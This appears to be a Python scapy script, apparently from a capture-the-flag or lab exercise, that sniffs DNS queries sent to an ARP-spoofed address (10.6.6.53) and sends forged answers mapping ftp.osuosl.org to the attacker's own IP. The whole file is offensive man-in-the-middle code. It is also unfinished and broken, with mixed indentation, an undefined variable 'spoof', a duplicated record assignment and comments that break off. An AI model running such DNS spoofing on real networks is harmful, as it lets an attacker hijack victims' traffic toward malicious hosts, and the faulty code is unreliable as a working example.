#!/usr/bin/python3
from scapy.all import *
import netifaces as ni
import uuid

# Our eth0 IP
ipaddr = ni.ifaddresses('eth0')[ni.AF_INET][0]['addr']
# Our Mac Addr
macaddr = ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0,8*6,8)][::-1])
# destination ip we arp spoofed
ipaddr_we_arp_spoofed = "10.6.6.53"
spoof_only="ftp.osuosl.org"

def handle_dns_request(packet):
    # Need to change mac addresses, Ip Addresses, and ports below.
	# We also need
	smac = packet[Ether].src
	sport = packet[UDP].sport
	sip = packet[IP].src
	# Spoof only a specific hostname here
	# if packet[DNS]...
    eth = Ether(src=macaddr, dst=smac) 
    ip  = IP(dst=sip, src=ipaddr_we_arp_spoofed)
    udp = UDP(dport=sport, sport=53)
	dnsrr = DNSRR(rrname=spoof_only, rdata=ipaddr)
	dnsrr = DNSRR(rrname=spoof, rdata=ipaddr)
    dns = DNS(id=packet[DNS].id,qr=1,aa=1,qd=packet[DNS].qd,an=dnsrr)
    dns_response = eth / ip / udp / dns
    
	print("DNS Query")
	packet.show()
	print("DNS Response")
	dns_response.show()
    sendp(dns_response, iface="eth0")
	
def main():
    berkeley_packet_filter = " and ".join( [
        "udp dst port 53",                              # dns
        "udp[10] & 0x80 = 0",                           # dns request
        "dst host {}".format(ipaddr_we_arp_spoofed),    # destination ip we had spoofed (not our real ip)
        "ether dst host {}".format(macaddr)             # our macaddress since we spoofed the ip to our mac
    ] )

    # sniff the eth0 int without storing packets in memory and stopping after one dns request
    sniff(filter=berkeley_packet_filter, prn=handle_dns_request, store=0, iface="eth0", count=1)